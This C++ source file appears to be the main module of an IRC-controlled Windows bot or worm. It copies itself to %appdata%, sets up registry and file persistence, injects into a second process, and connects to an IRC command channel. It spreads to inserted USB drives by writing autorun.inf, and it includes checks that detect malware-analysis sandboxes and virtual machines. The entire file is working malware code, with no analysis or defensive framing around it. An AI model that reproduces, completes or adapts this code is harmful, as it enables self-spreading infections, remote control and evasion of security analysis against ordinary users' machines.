#include "Includes/includes.hpp"
#include "Core/core.hpp"

bool				ShouldBail			( API *api );
char				FirstDriveFromMask	( DWORD unitmask );
int		__stdcall	CallBack			( HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam );
DWORD	__stdcall	MessagePump			( API *api );

HINSTANCE mainInstance;

DWORD apiaddr = 0;
DWORD ircaddr = 0;

DWORD GetApi( void ) {
	return apiaddr;
}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpParam, int nCmdShow) {
	mainInstance = hInstance;
	API api;
	api.beginning = api.GetTickCount();
	apiaddr = (DWORD)&api;

	char temp[MAX_PATH] = {0};
	api.GetModuleFileNameA(api.GetModuleHandleA(NULL), temp, MAX_PATH);
	temp[3] = '\0';
	if (api.GetDriveTypeA(temp) == DRIVE_REMOVABLE)
		api.ShellExecuteA(NULL, "open", temp, NULL, NULL, SW_SHOW);
	api.Sleep(5000); 
	
	/*if (ShouldBail(&api))
		return 0;*/
	
	char cfg_mutex[32] = {0};
	if (!RetrieveSetting(CFG_MTX, cfg_mutex))
		return 0;
	
	api.CreateMutexA(NULL, FALSE, cfg_mutex);
	if (api.GetLastError() == ERROR_ALREADY_EXISTS)
		return 0;
	
	api.ExpandEnvironmentStrings("%appdata%\\", temp, MAX_PATH);
	
	char cfg_regname[64] = {0};
	if(!RetrieveSetting(CFG_REG, cfg_regname))
		return false;
	
	api.regrunkey = cfg_regname;
	api.directory = temp;
	/*api.exefile = api.GenFileName(10) + ".exe";
	api.final = api.directory + api.exefile;*/
	api.GetModuleFileName(api.GetModuleHandle(NULL), temp, MAX_PATH);
	api.thisfile = temp;

	if (!Install( &api, api.exefile, api.directory))
		return 0;

	/*int pos = api.thisfile.find_last_of("\\") + 1;
	if (api.thisfile.substr(pos, api.thisfile.length() - pos) != api.exefile) {
		HKEY hKey; 
		if (api.RegOpenKeyEx(HKEY_CURRENT_USER, api.magic(api.magic(api.magic(REG_DIR))).c_str(), 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			DWORD size = api.thisfile.length();
			api.RegSetValueEx(hKey, "del", 0, REG_SZ, (BYTE*)api.thisfile.c_str(), size);
			api.RegCloseKey(hKey);
		}
		api.ShellExecuteA(NULL, "open", api.final.c_str(), NULL, api.directory.c_str(), SW_HIDE);
		return 0;
	}
	
	HKEY hKey;
	if (api.RegOpenKeyEx(HKEY_CURRENT_USER, api.magic(api.magic(api.magic(REG_DIR))).c_str(), 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		char todelete[MAX_PATH] = {0};
		DWORD size = MAX_PATH;
		api.RegQueryValueEx(hKey, "del", 0, NULL, (LPBYTE)todelete, &size);
		if (api.lstrcmp(todelete, "") != 0) {
			try {
				if (todelete[api.lstrlen(todelete) - 1] == '\r')
					todelete[api.lstrlen(todelete) - 1] = '\0';
				api.DeleteFile(todelete);
			} catch (int e) {}
			api.RegDeleteValue(hKey, "del");
		}
		api.RegCloseKey(hKey);
	}*/
	MD5 Md5;
	api.thismd5 = Md5.md5_file(&api, api.thisfile);
	
	InjectSister(&api);
	
	//=================================================================	
	api.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessagePump, &api, NULL, NULL);
	api.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RegistryPersistence, &api, NULL, NULL);
	api.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)FilePersistence, &api, NULL, NULL);
	api.hIneth = api.InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (!RetrieveSetting(CFG_SVHOST, cfg_server))
		return 0;
	if (!RetrieveSetting(CFG_SVPORT, cfg_port))
		return 0;
	if (!RetrieveSetting(CFG_SVPW, cfg_serverpw))
		return 0;
	if (!RetrieveSetting(CFG_CHAN, cfg_channel))
		return 0;
	if (!RetrieveSetting(CFG_CHANPW, cfg_channelpw))
		return 0;
	if (!RetrieveSetting(CFG_HOST, cfg_irchost))
		return 0;

	bool isNew = false, isUSB = false;

	switch (lpParam[0]) {
		case '1':
			isNew = true;
			break;
		case '2':
			isUSB = true;
			break;
		case '3':
			isUSB = true;
			isNew = true;
			break;
		default:
			break;
	}

	IRC irc(&api, cfg_server, cfg_port, cfg_serverpw, cfg_channel, cfg_channelpw, cfg_irchost, isNew, isUSB);
	ircaddr = (DWORD)&irc;
	irc.RootInit();
	return 0;
}

int __stdcall CallBack(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
	int lRet = 0;
	switch(message) {
		case WM_DEVICECHANGE: {
			API::PDEV_BROADCAST_HDR pHdr = (API::PDEV_BROADCAST_HDR) lParam; 
			switch (wParam) { 
				case 0x8000: { //DBT_DEVICEARRIVAL
					if (pHdr->dbch_devicetype == 0x00000002) { // DBT_DEVTYP_VOLUME
						API::PDEV_BROADCAST_VOLUME pVol = (API::PDEV_BROADCAST_VOLUME) pHdr; 
						char cDriveLetter = FirstDriveFromMask(pVol->dbcv_unitmask); 
						string drive = ""; drive.append(1, cDriveLetter); drive += ":\\";
						if (((API*)apiaddr)->GetFileSize(drive + "autorun.inf") != 35 && ((IRC*)ircaddr)->spreadusb) {
							USBI *usb = new USBI;
							usb->api = apiaddr;
							usb->irc = ircaddr;
							usb->drive = drive;
							usb->mode = 0;
							((API*)apiaddr)->CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)InfectDrive, usb, NULL, NULL);
						}
					}
					break;
				}
				//} case 0x8004: { //DBT_DEVICEREMOVALCOMPLETE
			}
		} default: {
			lRet = ((API*)apiaddr)->DefWindowProc(hWnd, message, wParam, lParam);
		}
	}
	return lRet;
}

DWORD __stdcall MessagePump( API *api ) {
	MSG msg;
	int retVal = 0;
	WNDCLASSEX wndClass;
    wndClass.cbSize = sizeof(WNDCLASSEX);
    wndClass.style = CS_OWNDC | CS_HREDRAW | CS_VREDRAW;
    wndClass.hInstance = reinterpret_cast<HINSTANCE>(GetModuleHandle(0));
    wndClass.lpfnWndProc = reinterpret_cast<WNDPROC>(CallBack);
    wndClass.cbClsExtra = 0;
    wndClass.cbWndExtra = 0;
    wndClass.hIcon = NULL;
    wndClass.hbrBackground = NULL;
    wndClass.hCursor = NULL;
    wndClass.lpszClassName = "3v";
    wndClass.lpszMenuName = NULL;
    wndClass.hIconSm = NULL;

    api->RegisterClassEx(&wndClass);
	HWND hwnd;
	hwnd = api->CreateWindowEx(NULL, "3v", NULL, NULL, 0, 0, 0, 0, NULL, NULL, mainInstance, NULL);	
	RegisterNotification(api, hwnd);
	while ((retVal = api->GetMessage(&msg, hwnd, 0, 0)) != 0 ) {
		if (retVal == -1)
			break;
		api->TranslateMessage(&msg);
        api->DispatchMessage(&msg);
		api->Sleep(1);
	}
	return 0;
}

char FirstDriveFromMask (DWORD unitmask) {
   char i;
   for (i = 0; i < 26; ++i) {
      if (unitmask & 0x1)
         break;
      unitmask = unitmask >> 1;
   }
   return (i + 'A');
}
/* --- ANUBIS, CWSandbox, JoeBox --- */
bool ShouldBail( API *api ) {
	HKEY hKey;
	char anbu[255] = {0};
	DWORD dwType = REG_SZ;
	DWORD size = sizeof(anbu);
	if (api->RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		if (api->RegQueryValueEx(hKey, "ProductId", 0, &dwType, (BYTE*)anbu, &size) == ERROR_SUCCESS) {
			if (api->lstrcmp(anbu, "76487-640-1457236-23837") == 0) // Anubis
				return true;
			if (api->lstrcmp(anbu, "76487-644-3177037-23510") == 0) // CWSandbox
				return true;
			if (api->lstrcmp(anbu, "55274-640-2673064-23950") == 0) // JoeBox
				return true;
		}
		api->RegCloseKey(hKey);
	}

	/* --- SANDBOXIE --- */
	if (api->GetModuleHandle("SbieDll.dll") != NULL) 
		return true;
	
	/* --- THREATEXPERT --- */
	if (api->GetModuleHandle("dbghelp.dll") != NULL)	
		return true;

	/* --- VIRTUALBOX --- */
	if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\IDE\\CdRomVBOX_CD-ROM_____________________________1.0_____", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		api->RegCloseKey(hKey);
		return true;
	}

	/* --- VMWARE --- */
	if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\IDE\\CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		api->RegCloseKey(hKey);
		return true;
	}

	/* --- VIRTUAL PC --- */
	if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\IDE\\DiskVirtual_HD______________________________1._1____", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		api->RegCloseKey(hKey);
		return true;
	}
	return false;
}

